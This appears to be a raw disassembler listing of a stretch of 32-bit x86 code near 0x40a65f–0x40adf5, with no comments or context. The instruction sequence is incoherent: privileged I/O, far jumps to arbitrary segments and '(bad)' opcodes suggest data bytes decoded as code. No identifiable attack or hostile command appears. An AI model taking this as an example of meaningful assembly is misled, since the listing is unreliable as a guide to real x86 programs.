  40a65f:	xchg   BYTE PTR [ecx-0xf],bl
  40a662:	adc    eax,eax
  40a664:	cmp    ebx,eax
  40a666:	push   es
  40a667:	ret    0x7da2
  40a66a:	in     al,0xf0
  40a66c:	and    BYTE PTR [ebx+0x3a],dh
  40a66f:	and    dl,bl
  40a671:	shrd   DWORD PTR [edx],ebx,0xba
  40a675:	retf   0x497
  40a678:	pushf  
  40a679:	daa    
  40a67a:	cmp    al,BYTE PTR [ebp+0x545b928]
  40a680:	iret   
  40a681:	loope  0x40a68e
  40a683:	xchg   esp,eax
  40a684:	jg     0x40a671
  40a686:	cdq    
  40a687:	ins    BYTE PTR es:[edi],dx
  40a688:	adc    DWORD PTR ds:0xf4833f12,ecx
  40a68e:	arpl   WORD PTR [esi+0x3],bp
  40a691:	add    al,0xb9
  40a693:	push   ebp
  40a694:	push   esp
  40a695:	or     BYTE PTR [ecx+0x47],cl
  40a698:	xchg   DWORD PTR [esp+edi*2+0x1d105088],edx
  40a69f:	gs outs dx,DWORD PTR es:[esi]
  40a6a2:	push   ds
  40a6a3:	jmp    0xd543:0x69bde58b
  40a6aa:	or     edx,esp
  40a6ac:	(bad)  
  40a6ad:	push   esp
  40a6ae:	and    BYTE PTR es:[ebx-0xa4f7e1e],dh
  40a6b5:	out    0xdb,al
  40a6b7:	mov    bl,0xf2
  40a6b9:	mov    edi,0x2b92c678
  40a6be:	xchg   ebx,eax
  40a6bf:	jno    0x40a644
  40a6c1:	call   0x59c87a1c
  40a6c6:	imul   ecx,DWORD PTR [ebx+0x6d],0xdd7e662c
  40a6cd:	int3   
  40a6ce:	adc    ah,bh
  40a6d0:	call   0xc684:0x916a9850
  40a6d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6d8:	aam    0x46
  40a6da:	fwait
  40a6db:	adc    BYTE PTR [edi],dh
  40a6dd:	push   esp
  40a6de:	add    BYTE PTR [edi+0x507ae809],ch
  40a6e4:	lods   eax,DWORD PTR ds:[esi]
  40a6e5:	xchg   ebp,eax
  40a6e6:	jno    0x40a66e
  40a6e8:	rcr    DWORD PTR [ebx+0x2b402832],1
  40a6ee:	imul   ecx,DWORD PTR [eax-0x6483f0c8],0x6
  40a6f5:	mov    bl,0x1b
  40a6f7:	mov    edi,0xc917a18f
  40a6fc:	pop    esi
  40a6fd:	loop   0x40a6cf
  40a6ff:	arpl   WORD PTR [ebp+eax*2+0xf],di
  40a703:	sub    BYTE PTR [esi+0x22],0x7a
  40a707:	mov    WORD PTR [ebp+0x64],fs
  40a70a:	push   ebx
  40a70b:	pop    edx
  40a70c:	xor    edi,DWORD PTR [ebp+ecx*8-0x4a]
  40a710:	aad    0x90
  40a712:	push   esp
  40a713:	stc    
  40a714:	or     ch,0x87
  40a717:	push   ebx
  40a718:	dec    eax
  40a719:	or     eax,0x16f8038a
  40a71e:	push   edx
  40a71f:	inc    eax
  40a720:	loopne 0x40a70a
  40a722:	hlt    
  40a723:	inc    ebp
  40a724:	push   ss
  40a725:	xchg   edx,eax
  40a726:	mov    ds:0x81d08ac,al
  40a72b:	mov    edi,0x857fde77
  40a730:	sbb    BYTE PTR [esi-0x451ad091],dh
  40a736:	test   eax,0x5692bf84
  40a73b:	dec    esp
  40a73c:	fistp  DWORD PTR [edx+ebp*1]
  40a73f:	outs   dx,BYTE PTR ds:[esi]
  40a740:	xchg   edi,eax
  40a741:	add    DWORD PTR [edx],ebp
  40a743:	cmp    ah,BYTE PTR [eax+0x380d504]
  40a749:	or     ecx,DWORD PTR [ebx-0x517cfd4e]
  40a74f:	pop    esi
  40a750:	loopne 0x40a7b9
  40a752:	scas   eax,DWORD PTR es:[edi]
  40a753:	jmp    FWORD PTR ds:0x50cd9921
  40a759:	dec    esi
  40a75a:	mov    dl,0x8b
  40a75c:	mov    eax,ds:0xb666d91d
  40a761:	mov    cl,0xba
  40a763:	mov    ah,0x6d
  40a765:	rol    DWORD PTR cs:[esi-0x4d],cl
  40a769:	sti    
  40a76a:	mov    BYTE PTR [eax+0x14e7d466],ch
  40a770:	or     ebx,DWORD PTR [esi]
  40a772:	inc    esi
  40a773:	bound  esi,QWORD PTR [ebx]
  40a775:	jp     0x40a7d4
  40a777:	fucom  st(3)
  40a779:	cs cmc 
  40a77b:	xchg   ecx,eax
  40a77c:	in     eax,0x4e
  40a77e:	sti    
  40a77f:	xor    DWORD PTR [edx-0x15],0xdb864c73
  40a786:	xor    eax,0x8c3af23b
  40a78b:	xchg   ebx,eax
  40a78c:	add    ebp,esi
  40a78e:	mov    esi,0xc295d3b3
  40a793:	and    bl,BYTE PTR [ecx]
  40a795:	fwait
  40a796:	jns    0x40a740
  40a798:	psllw  mm0,QWORD PTR [ecx]
  40a79b:	lock sub BYTE PTR [esi],cl
  40a79e:	push   eax
  40a79f:	or     DWORD PTR [edx+0x1adf110f],0xc161380e
  40a7a9:	xchg   ecx,eax
  40a7aa:	pop    edi
  40a7ab:	push   esp
  40a7ac:	mov    al,ds:0x91a6d5ce
  40a7b1:	jmp    0xa7f3afb0
  40a7b6:	or     al,0x55
  40a7b8:	ret    0x5046
  40a7bb:	pop    edx
  40a7bc:	(bad)  [eax+0x29]
  40a7bf:	pop    es
  40a7c0:	sbb    bh,0x24
  40a7c3:	mov    ds:0x3209d9d7,al
  40a7c8:	mov    WORD PTR [ebx],gs
  40a7ca:	jge    0x40a7d2
  40a7cc:	push   eax
  40a7cd:	mov    eax,ds:0xe3ccd4ec
  40a7d2:	(bad)  
  40a7d3:	and    ecx,edx
  40a7d5:	mov    esi,0x36df39ad
  40a7da:	fadd   DWORD PTR [ebx-0x59fd5448]
  40a7e0:	sahf   
  40a7e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7e2:	ss (bad) 
  40a7e4:	mov    ecx,ebx
  40a7e6:	repz adc eax,0xbf8f4cdb
  40a7ec:	push   es
  40a7ed:	int3   
  40a7ee:	push   0x566bb350
  40a7f3:	inc    edx
  40a7f4:	cs dec ecx
  40a7f6:	shr    DWORD PTR [ebp+0x45],1
  40a7f9:	inc    ecx
  40a7fa:	xchg   ebx,eax
  40a7fb:	fld    DWORD PTR [eax+ebx*4+0x4b]
  40a7ff:	sub    dl,bl
  40a801:	jl     0x40a842
  40a803:	cmp    ebp,esi
  40a805:	push   eax
  40a806:	rcl    BYTE PTR [ecx],1
  40a808:	add    DWORD PTR [eax],esi
  40a80a:	push   ecx
  40a80b:	mov    DWORD PTR [ecx],edi
  40a80d:	rcr    BYTE PTR [edi+0xf7377a0],1
  40a813:	(bad)  
  40a814:	loopne 0x40a7c2
  40a816:	cmp    DWORD PTR [esi],0xdb613925
  40a81c:	clc    
  40a81d:	shr    BYTE PTR [eax],0x38
  40a820:	xor    eax,DWORD PTR [esi]
  40a822:	lods   al,BYTE PTR ds:[esi]
  40a823:	inc    ebp
  40a824:	sbb    DWORD PTR [ecx+0xd190dfc],esi
  40a82a:	lahf   
  40a82b:	data16 sbb ah,BYTE PTR [ebx-0x15]
  40a82f:	or     cl,BYTE PTR [ecx+0x16]
  40a832:	into   
  40a833:	cmp    ah,dl
  40a835:	sub    eax,0x950d1a6e
  40a83a:	mov    al,ds:0xecdee6e9
  40a83f:	cmp    eax,DWORD PTR ds:0x1882350a
  40a845:	imul   esi,ebp,0x43
  40a848:	inc    eax
  40a849:	and    cl,BYTE PTR [edx+0x24325d5e]
  40a84f:	mov    BYTE PTR [edi],cl
  40a851:	scas   al,BYTE PTR es:[edi]
  40a852:	mov    esp,0x85e69928
  40a857:	fs mov cl,0x6b
  40a85a:	mov    ecx,0xa9bfd2c6
  40a85f:	or     eax,0x1b98049a
  40a864:	push   ecx
  40a865:	inc    esp
  40a866:	popf   
  40a867:	xchg   DWORD PTR [esi+0x6b3a549b],edi
  40a86d:	mov    ds:0xe89b44c,eax
  40a872:	ret    0x535a
  40a875:	ja     0x40a89d
  40a877:	hlt    
  40a878:	lahf   
  40a879:	ins    BYTE PTR es:[edi],dx
  40a87a:	xchg   ebp,eax
  40a87b:	mov    bl,0xb9
  40a87d:	jo     0x40a899
  40a87f:	mov    al,0x7b
  40a881:	rcl    DWORD PTR [ecx+edx*2+0x402ed0ab],cl
  40a888:	push   ebp
  40a889:	jo     0x40a8b5
  40a88b:	cwde   
  40a88c:	retf   0x589d
  40a88f:	push   ss
  40a890:	mov    ch,0xdc
  40a892:	and    eax,0x4569927e
  40a897:	daa    
  40a898:	inc    esi
  40a899:	dec    ebx
  40a89a:	mov    WORD PTR [ecx],es
  40a89c:	or     DWORD PTR [ecx],ecx
  40a89e:	mov    ch,0xf4
  40a8a0:	or     eax,0xeb592923
  40a8a5:	mov    bl,0x68
  40a8a7:	and    edx,eax
  40a8a9:	popa   
  40a8aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8ab:	sbb    edi,DWORD PTR [edx+0x2bc42868]
  40a8b1:	ret    
  40a8b2:	adc    DWORD PTR [esi],0xc736d43
  40a8b8:	add    edx,DWORD PTR [ecx+0x4a858618]
  40a8be:	(bad)  
  40a8bf:	in     al,dx
  40a8c0:	test   DWORD PTR [edi+esi*1-0x21],0xe8011e8e
  40a8c8:	pop    ebp
  40a8c9:	cmp    DWORD PTR [edx],esi
  40a8cb:	or     al,0xec
  40a8cd:	fld    QWORD PTR [edi+0x3ea3059e]
  40a8d3:	mov    eax,0x2a425725
  40a8d8:	call   0x11350d7f
  40a8dd:	test   edx,esp
  40a8df:	ret    
  40a8e0:	shr    DWORD PTR [eax],1
  40a8e2:	xchg   esp,eax
  40a8e3:	adc    eax,0x90b5fec1
  40a8e8:	mov    ds:0x766f7db3,eax
  40a8ed:	push   0x1808e995
  40a8f2:	gs push ebp
  40a8f4:	mov    edi,0x91d6df35
  40a8f9:	dec    eax
  40a8fa:	icebp  
  40a8fb:	lahf   
  40a8fc:	and    bh,BYTE PTR [eax-0xe]
  40a8ff:	int3   
  40a900:	mov    ebx,0xf07c6b08
  40a905:	push   ebx
  40a906:	cli    
  40a907:	scas   eax,DWORD PTR es:[edi]
  40a908:	in     al,0x42
  40a90a:	pop    esp
  40a90b:	sub    dl,bh
  40a90d:	push   ecx
  40a90e:	xchg   DWORD PTR [esi+0xa],esp
  40a911:	enter  0x4eb3,0x89
  40a915:	(bad)  
  40a917:	or     al,cl
  40a919:	or     eax,0xcd757d8e
  40a91e:	rol    ebx,cl
  40a920:	mov    ds:0xc30c359d,eax
  40a925:	cmp    BYTE PTR [ebp-0x27],0x38
  40a929:	pop    edx
  40a92a:	lock dec ebx
  40a92c:	sahf   
  40a92d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a92e:	dec    edx
  40a92f:	test   ebx,esi
  40a931:	pusha  
  40a932:	xor    al,0x91
  40a934:	sub    eax,0x589e03b1
  40a939:	repnz in eax,0x88
  40a93c:	pop    ebx
  40a93d:	(bad)  
  40a93e:	imul   ecx,ecx,0x9418ce9b
  40a944:	dec    ecx
  40a945:	call   0xe885:0xf18d7b07
  40a94c:	test   BYTE PTR [ebx],dh
  40a94e:	add    DWORD PTR ds:0xa3ded5d,ebp
  40a954:	mov    ecx,0x3a4f794e
  40a959:	ret    0x5fd9
  40a95c:	test   BYTE PTR ss:[ecx*8-0x69ceb8bb],0xd8
  40a965:	sub    edi,DWORD PTR fs:[ebx-0x53]
  40a969:	pop    ebx
  40a96a:	jmp    0xe7fba40f
  40a96f:	sti    
  40a970:	scas   al,BYTE PTR es:[edi]
  40a971:	mov    ebp,0x5e1912d1
  40a976:	pop    es
  40a977:	call   FWORD PTR [ecx+0x17a346f2]
  40a97d:	arpl   WORD PTR [eax-0x1],si
  40a980:	loop   0x40a9ea
  40a982:	stos   BYTE PTR es:[edi],al
  40a983:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a984:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a985:	mov    WORD PTR [ebx],?
  40a987:	jmp    0x529c:0xf36fc78b
  40a98e:	enter  0x2426,0xf6
  40a992:	pop    ecx
  40a993:	mov    si,0x4864
  40a997:	jne    0x40a954
  40a999:	xchg   edi,eax
  40a99a:	adc    al,0x4e
  40a99c:	xor    DWORD PTR [edi-0x2bb7ce5],ebx
  40a9a2:	loope  0x40a9b7
  40a9a4:	or     al,0x58
  40a9a6:	sbb    ebx,ebx
  40a9a8:	inc    edi
  40a9a9:	test   eax,0x73a7c00c
  40a9ae:	inc    esi
  40a9af:	clc    
  40a9b0:	retf   0x75ab
  40a9b3:	jns    0x40a98f
  40a9b5:	sbb    ch,ah
  40a9b7:	push   ebx
  40a9b8:	sub    ebp,esi
  40a9ba:	(bad)  
  40a9bb:	sbb    esp,DWORD PTR [eax-0x7a2334ac]
  40a9c1:	mov    cl,0x8c
  40a9c3:	aam    0x72
  40a9c5:	and    BYTE PTR [ebx+eax*8-0x39],ch
  40a9c9:	mul    bh
  40a9cb:	ins    BYTE PTR es:[edi],dx
  40a9cc:	pop    edi
  40a9cd:	mov    ebx,0xdef326cd
  40a9d2:	int3   
  40a9d3:	fcomp  DWORD PTR [edx]
  40a9d5:	push   edi
  40a9d6:	and    al,0x87
  40a9d8:	adc    eax,DWORD PTR [ecx+0x53]
  40a9db:	sbb    BYTE PTR [esi+0x4bd42557],0xe8
  40a9e2:	adc    al,0xb1
  40a9e4:	sbb    DWORD PTR es:[ecx-0x24904820],eax
  40a9eb:	jo     0x40aa35
  40a9ed:	mov    WORD PTR [edx],fs
  40a9ef:	int    0x43
  40a9f1:	stos   DWORD PTR es:[edi],eax
  40a9f2:	push   edx
  40a9f3:	xlat   BYTE PTR ds:[ebx]
  40a9f4:	mov    eax,esp
  40a9f6:	(bad)  
  40a9f7:	out    dx,al
  40a9f8:	cmp    ebx,DWORD PTR [edx+0x5d71ac7d]
  40a9fe:	lods   eax,DWORD PTR ds:[esi]
  40a9ff:	xchg   edi,eax
  40aa00:	icebp  
  40aa01:	fwait
  40aa02:	xor    dl,dh
  40aa04:	mov    BYTE PTR [edi-0x23],0xa
  40aa08:	pop    esi
  40aa09:	mov    edx,0x805e584
  40aa0e:	ror    DWORD PTR [edi-0x3f795d0d],1
  40aa14:	adc    dh,BYTE PTR [ebp-0x76]
  40aa17:	push   cs
  40aa18:	pop    ss
  40aa19:	imul   ebp,DWORD PTR [eax],0x2a7e44de
  40aa1f:	(bad)  
  40aa20:	xor    BYTE PTR [eax+0x3cef5bf8],bl
  40aa26:	sbb    BYTE PTR [ecx],0xcd
  40aa29:	jmp    FWORD PTR [edi+ebx*8+0xd5cc66c]
  40aa30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa31:	mov    edi,0x109efb56
  40aa36:	loopne 0x40aa6c
  40aa38:	popa   
  40aa39:	es nop
  40aa3b:	and    DWORD PTR [ebx],ebp
  40aa3d:	rol    DWORD PTR [edx-0x1c],1
  40aa40:	xor    ebp,edx
  40aa42:	push   0x3
  40aa44:	dec    edi
  40aa45:	es iret 
  40aa47:	adc    eax,0x10422da
  40aa4c:	lahf   
  40aa4d:	sbb    esp,DWORD PTR [ebx-0x46c22a53]
  40aa53:	test   eax,0xfd99392a
  40aa58:	mov    bh,0x3e
  40aa5a:	add    dl,al
  40aa5c:	loop   0x40aa4b
  40aa5e:	add    eax,0x835968e3
  40aa63:	push   esi
  40aa64:	lea    ebp,[edi+0x74]
  40aa67:	data16 cli 
  40aa69:	push   esi
  40aa6a:	jmp    0x5cb5:0x67ae0df
  40aa71:	pushf  
  40aa72:	popf   
  40aa73:	call   0x362:0xeebd9a3
  40aa7a:	push   cs
  40aa7b:	sbb    DWORD PTR [eax],edi
  40aa7d:	sahf   
  40aa7e:	push   es
  40aa7f:	push   esi
  40aa80:	aam    0x13
  40aa82:	cmp    ebx,DWORD PTR [edi]
  40aa84:	dec    edx
  40aa85:	xchg   ecx,eax
  40aa86:	and    DWORD PTR [ebx],esp
  40aa88:	sub    DWORD PTR [eax+eiz*4-0x297f20c],0xe30e670d
  40aa93:	fcmovnbe st,st(5)
  40aa95:	ficomp DWORD PTR [edi+ebp*8+0x3]
  40aa99:	jecxz  0x40ab0f
  40aa9b:	push   ss
  40aa9c:	je     0x40aab4
  40aa9e:	dec    eax
  40aa9f:	inc    ecx
  40aaa0:	dec    ebp
  40aaa1:	popa   
  40aaa2:	aam    0xbc
  40aaa4:	and    ebp,DWORD PTR [edi]
  40aaa6:	ds mov ch,0x2d
  40aaa9:	sub    DWORD PTR [ebx+0x1b],esp
  40aaac:	pop    edx
  40aaad:	xor    al,0x9b
  40aaaf:	or     eax,0x8ffd4038
  40aab4:	or     BYTE PTR [edx-0x6a],cl
  40aab7:	test   eax,0x9dca1a5c
  40aabc:	fidivr WORD PTR [ecx+0x1a]
  40aabf:	cmp    ecx,DWORD PTR [esi+0x36]
  40aac2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aac3:	adc    ecx,edx
  40aac5:	xchg   edx,eax
  40aac6:	je     0x40aaba
  40aac8:	loope  0x40aac0
  40aaca:	fild   QWORD PTR [ecx+0x52]
  40aacd:	cmp    eax,0xcc29fbf4
  40aad2:	jae    0x40aa73
  40aad4:	pop    ebp
  40aad5:	cmc    
  40aad6:	into   
  40aad7:	repz xchg ecx,eax
  40aad9:	test   eax,0x897920a5
  40aade:	inc    esp
  40aadf:	sbb    ecx,DWORD PTR [edx]
  40aae1:	push   0x4672c72f
  40aae6:	les    eax,FWORD PTR [ebx-0x22af4c90]
  40aaec:	jp     0x40aa84
  40aaee:	push   0xffffffe0
  40aaf0:	(bad)  
  40aaf1:	mov    esi,0x5c4263b0
  40aaf6:	ret    0xd021
  40aaf9:	aad    0xfe
  40aafb:	jae    0x40ab50
  40aafd:	cmp    al,0x39
  40aaff:	add    eax,0xd7ed7ec1
  40ab04:	jmp    0x40ab08
  40ab06:	enter  0x88f6,0xf3
  40ab0a:	inc    esi
  40ab0b:	pop    edi
  40ab0c:	xchg   BYTE PTR [edx],dl
  40ab0e:	and    al,0xc0
  40ab10:	add    al,0xac
  40ab12:	lea    edi,[bp+si]
  40ab15:	inc    ebx
  40ab16:	pop    ecx
  40ab17:	jno    0x40ab74
  40ab19:	fadd   QWORD PTR [ebx-0x7018d467]
  40ab1f:	mov    ebx,0x88e176e7
  40ab24:	retf   
  40ab25:	inc    esp
  40ab26:	add    BYTE PTR [ebx+0x57b5d711],dl
  40ab2c:	inc    DWORD PTR [ecx-0x1f6c5e5a]
  40ab32:	data16 cld 
  40ab34:	xor    BYTE PTR [ecx],al
  40ab36:	jecxz  0x40aaca
  40ab38:	mov    ds:0x323bcf35,al
  40ab3d:	or     DWORD PTR [esi+0x59],0x502c2308
  40ab44:	icebp  
  40ab45:	push   ds
  40ab46:	xchg   esi,eax
  40ab47:	xchg   edx,eax
  40ab48:	mov    ecx,0x56f05b0c
  40ab4d:	pop    esi
  40ab4e:	retf   0x957d
  40ab51:	cmc    
  40ab52:	loopne 0x40aaf7
  40ab54:	cmp    al,0x4b
  40ab56:	stos   DWORD PTR es:[edi],eax
  40ab57:	jp     0x40aba1
  40ab59:	dec    ebx
  40ab5a:	fiadd  WORD PTR [ecx]
  40ab5c:	jmp    0x42a6:0x7bf0e85d
  40ab63:	add    al,0xb3
  40ab65:	cdq    
  40ab66:	sbb    al,bl
  40ab68:	adc    BYTE PTR [eax-0x56],dh
  40ab6b:	cwde   
  40ab6c:	sbb    eax,0xad487e29
  40ab71:	outs   dx,BYTE PTR ds:[esi]
  40ab72:	es mov dl,0x6
  40ab75:	shl    DWORD PTR [eax-0x69],0xa7
  40ab79:	cld    
  40ab7a:	xchg   ecx,ecx
  40ab7c:	in     eax,dx
  40ab7d:	dec    edi
  40ab7e:	mov    bh,0x1e
  40ab80:	inc    edx
  40ab81:	adc    eax,0x1ae43bbb
  40ab86:	and    cl,BYTE PTR [eax+esi*1-0x63]
  40ab8a:	push   esp
  40ab8b:	push   esp
  40ab8c:	sub    ebp,DWORD PTR [esi+0x7b]
  40ab8f:	push   esp
  40ab90:	dec    edx
  40ab91:	mov    ds:0xb6dd13f2,eax
  40ab96:	ss hlt 
  40ab98:	cmp    al,0x46
  40ab9a:	neg    BYTE PTR [edi]
  40ab9c:	jnp    0x40ac19
  40ab9e:	loop   0x40abd1
  40aba0:	mov    bh,0x3e
  40aba2:	mov    BYTE PTR [edx+0x775d151e],ch
  40aba8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aba9:	and    DWORD PTR [ebx],ebx
  40abab:	jg     0x40abb8
  40abad:	out    0xd2,eax
  40abaf:	out    0xcf,eax
  40abb1:	dec    ebp
  40abb2:	jae    0x40abd4
  40abb4:	jae    0x40ac29
  40abb6:	sub    edi,esi
  40abb8:	mov    ebx,eax
  40abba:	jmp    0xa1c0:0x91a8f7f6
  40abc1:	xchg   ebp,eax
  40abc2:	ins    DWORD PTR es:[edi],dx
  40abc3:	add    ecx,DWORD PTR [edi]
  40abc5:	cdq    
  40abc6:	mov    ecx,0xb91b411f
  40abcb:	sub    eax,0x488f3f7d
  40abd0:	int    0xe4
  40abd2:	cmp    esp,esp
  40abd4:	dec    ebx
  40abd5:	adc    bl,cl
  40abd7:	scas   eax,DWORD PTR es:[edi]
  40abd8:	push   cs
  40abd9:	ret    
  40abda:	xor    al,BYTE PTR [esi+esi*2-0x79]
  40abde:	push   ebp
  40abdf:	xchg   esi,eax
  40abe0:	xlat   BYTE PTR ds:[ebx]
  40abe1:	aad    0xf3
  40abe3:	dec    ebp
  40abe4:	je     0x40abcc
  40abe6:	mov    DWORD PTR [ecx],ebp
  40abe8:	cli    
  40abe9:	jle    0x40aba6
  40abeb:	adc    eax,0xd662b594
  40abf0:	sbb    BYTE PTR [esi-0x1b],dh
  40abf3:	sub    bh,bl
  40abf5:	lahf   
  40abf6:	aas    
  40abf7:	ret    0x8425
  40abfa:	imul   esi,DWORD PTR [edx],0x911c32c7
  40ac00:	sbb    ch,al
  40ac02:	test   eax,0x80191889
  40ac07:	rol    DWORD PTR [eax-0x7b],cl
  40ac0a:	or     DWORD PTR [esi+0x73058bea],ebp
  40ac10:	std    
  40ac11:	sbb    ah,ch
  40ac13:	out    dx,eax
  40ac14:	aas    
  40ac15:	mov    dh,BYTE PTR [eax+0x231ee0ad]
  40ac1b:	(bad)  
  40ac1e:	sbb    eax,DWORD PTR [eax]
  40ac20:	inc    ebp
  40ac21:	out    0x2a,eax
  40ac23:	or     BYTE PTR [ecx],bl
  40ac25:	aam    0xf0
  40ac27:	in     al,0x70
  40ac29:	dec    eax
  40ac2a:	pop    es
  40ac2b:	pop    ds
  40ac2c:	cmc    
  40ac2d:	xor    DWORD PTR [edi+0x34],edi
  40ac30:	inc    esp
  40ac31:	mov    al,0x8
  40ac33:	xchg   ebp,eax
  40ac34:	lods   eax,DWORD PTR ds:[esi]
  40ac35:	sti    
  40ac36:	inc    edx
  40ac37:	push   0xffffffae
  40ac39:	retf   
  40ac3a:	std    
  40ac3b:	mov    ebx,0x3083cfb1
  40ac40:	fcomi  st,st(0)
  40ac42:	sbb    ch,BYTE PTR [esi+0x32703878]
  40ac48:	loopne 0x40ac3a
  40ac4a:	dec    ebp
  40ac4b:	jns    0x40abfa
  40ac4d:	popf   
  40ac4e:	xchg   esp,eax
  40ac4f:	jnp    0x40ac41
  40ac51:	sti    
  40ac52:	inc    edi
  40ac53:	inc    ebx
  40ac54:	cmp    eax,0x85cb90f3
  40ac59:	(bad)  
  40ac5a:	pop    esi
  40ac5b:	mov    bl,0x2a
  40ac5d:	retf   0x9acb
  40ac60:	adc    edi,DWORD PTR [edx]
  40ac62:	fcomp  QWORD PTR [ecx-0x44e172f9]
  40ac68:	outs   dx,BYTE PTR ds:[esi]
  40ac69:	push   cs
  40ac6a:	inc    ecx
  40ac6b:	or     BYTE PTR [ecx+eax*2],ah
  40ac6e:	aaa    
  40ac6f:	jmp    0xf084:0x9b14921b
  40ac76:	repnz or esi,esp
  40ac79:	frstor [eax+0x60137aba]
  40ac7f:	(bad)
  40ac83:	fidiv  WORD PTR [esi]
  40ac85:	aam    0x3c
  40ac87:	cmp    ah,dl
  40ac89:	repnz fidivr WORD PTR [edx-0x5c]
  40ac8d:	jo     0x40ac2c
  40ac8f:	pushf  
  40ac90:	xchg   BYTE PTR [edx-0x1],ah
  40ac93:	scas   al,BYTE PTR es:[edi]
  40ac94:	fwait
  40ac95:	aaa    
  40ac96:	sahf   
  40ac97:	add    dl,BYTE PTR [ebp+0x32518881]
  40ac9d:	mov    eax,0xc83dc8d4
  40aca2:	call   0x2af8e5b3
  40aca7:	sahf   
  40aca8:	adc    dl,BYTE PTR [edx+0x7474144]
  40acae:	call   0x76c0:0x708e32ee
  40acb5:	arpl   WORD PTR [esi-0x79],bp
  40acb8:	fs jge 0x40acb7
  40acbb:	aaa    
  40acbc:	es xchg bh,ch
  40acbf:	mov    ah,BYTE PTR [esi]
  40acc1:	mov    ebp,0x8de45635
  40acc6:	sahf   
  40acc7:	sub    eax,0x44321392
  40accc:	fadd   st,st(6)
  40acce:	xchg   edi,eax
  40accf:	out    dx,eax
  40acd0:	(bad)  
  40acd1:	in     eax,0x30
  40acd3:	repz and BYTE PTR [esi-0x75],bl
  40acd7:	and    BYTE PTR [ecx-0x76],dl
  40acda:	add    DWORD PTR [edx-0x48],ecx
  40acdd:	dec    edx
  40acde:	mov    ah,0xe7
  40ace0:	sbb    DWORD PTR [edx-0x1ef13ba],ecx
  40ace6:	mov    al,ds:0xfcf63993
  40aceb:	push   ecx
  40acec:	test   eax,0x4d31ae6b
  40acf1:	jbe    0x40acdd
  40acf3:	mov    DWORD PTR [ecx-0x54],0x9c8491ca
  40acfa:	ins    DWORD PTR es:[edi],dx
  40acfb:	push   es
  40acfc:	sbb    esp,DWORD PTR [ebp+0x7431fee5]
  40ad02:	mov    ds:0xf2e990a1,al
  40ad07:	mov    ecx,0xfaf16dc7
  40ad0c:	out    dx,eax
  40ad0d:	sub    al,0x47
  40ad0f:	jb     0x40acbb
  40ad11:	sbb    dh,ah
  40ad13:	ds popf 
  40ad15:	int3   
  40ad16:	jp     0x40acc7
  40ad18:	or     BYTE PTR [esi-0x31],dh
  40ad1b:	xchg   BYTE PTR [eax],ah
  40ad1d:	dec    esi
  40ad1e:	mov    WORD PTR [edx-0x8],?
  40ad21:	ror    ah,0x8f
  40ad24:	cs in  eax,0xe5
  40ad27:	popa   
  40ad28:	sbb    ebp,esp
  40ad2a:	cmp    al,0xcd
  40ad2c:	or     al,0xfc
  40ad2e:	repnz or ebx,DWORD PTR ds:0xeef7caff
  40ad35:	icebp  
  40ad36:	inc    ebx
  40ad37:	daa    
  40ad38:	sub    bh,al
  40ad3a:	enter  0x9916,0x4c
  40ad3e:	je     0x40ad53
  40ad40:	jno    0x40adbe
  40ad42:	cli    
  40ad43:	sti    
  40ad44:	imul   eax,DWORD PTR [ebx-0x7a5e784a],0xffffffc8
  40ad4b:	sub    al,BYTE PTR [edx+0x58b5881]
  40ad51:	leave  
  40ad52:	mov    eax,0x68ffeaea
  40ad57:	and    al,BYTE PTR ds:0xc4116c04
  40ad5d:	pop    ebx
  40ad5e:	jo     0x40ad0c
  40ad60:	or     ecx,esi
  40ad62:	xchg   ecx,eax
  40ad63:	jg     0x40acfd
  40ad65:	add    al,0xc5
  40ad67:	ret    
  40ad68:	inc    edx
  40ad69:	or     edi,ebx
  40ad6b:	pusha  
  40ad6c:	pop    esi
  40ad6d:	mov    cl,0xf3
  40ad6f:	popf   
  40ad70:	dec    ebx
  40ad71:	push   0x14fff882
  40ad76:	loopne 0x40ad83
  40ad78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad79:	aas    
  40ad7a:	inc    ebp
  40ad7b:	inc    ecx
  40ad7c:	outs   dx,BYTE PTR ds:[esi]
  40ad7d:	dec    ecx
  40ad7e:	aas    
  40ad7f:	or     ebx,ecx
  40ad81:	jmp    0x47b71baa
  40ad86:	jns    0x40adaf
  40ad88:	clc    
  40ad89:	add    ecx,ecx
  40ad8b:	outs   dx,DWORD PTR ds:[esi]
  40ad8c:	jl     0x40ad2a
  40ad8e:	in     al,dx
  40ad8f:	repnz cmp BYTE PTR ds:[eax+0x18],ch
  40ad94:	lahf   
  40ad95:	into   
  40ad96:	cwde   
  40ad97:	jmp    0x2e6d2ba0
  40ad9c:	xor    al,0x7d
  40ad9e:	je     0x40ad9c
  40ada0:	imul   esi,edx,0x3e
  40ada3:	push   edi
  40ada4:	push   ds
  40ada5:	push   0xfffffffd
  40ada7:	aad    0xc7
  40ada9:	jno    0x40add6
  40adab:	or     al,0x9b
  40adad:	das    
  40adae:	dec    eax
  40adaf:	repnz sub al,0x58
  40adb2:	sbb    al,0xcb
  40adb4:	dec    edi
  40adb5:	fadd   DWORD PTR [ebx+0xc5aff62]
  40adbb:	and    esp,DWORD PTR [ecx+esi*8+0x467415cd]
  40adc2:	in     eax,dx
  40adc3:	scas   eax,DWORD PTR es:[edi]
  40adc4:	test   al,0xaf
  40adc6:	js     0x40adf5
  40adc8:	das    
  40adc9:	call   0xc354:0x82afc324
  40add0:	hlt    
  40add1:	inc    esp
  40add2:	loopne 0x40ae52
  40add4:	xor    al,0xa7
  40add6:	inc    edx
  40add7:	and    BYTE PTR [esi],bh
  40add9:	hlt    
  40adda:	mov    eax,ds:0x83661246
  40addf:	xchg   ebx,eax
  40ade0:	xchg   ecx,eax
  40ade1:	retf   0x579c
  40ade4:	scas   al,BYTE PTR es:[edi]
  40ade5:	sub    al,0x2
  40ade7:	cmp    DWORD PTR [ebx+0x255d0fab],esp
  40aded:	int3   
  40adee:	cmp    DWORD PTR [ebx+0xf],0x835604ea
  40adf5:	fisttp DWORD PTR [eax+0x2d8dc0c7]
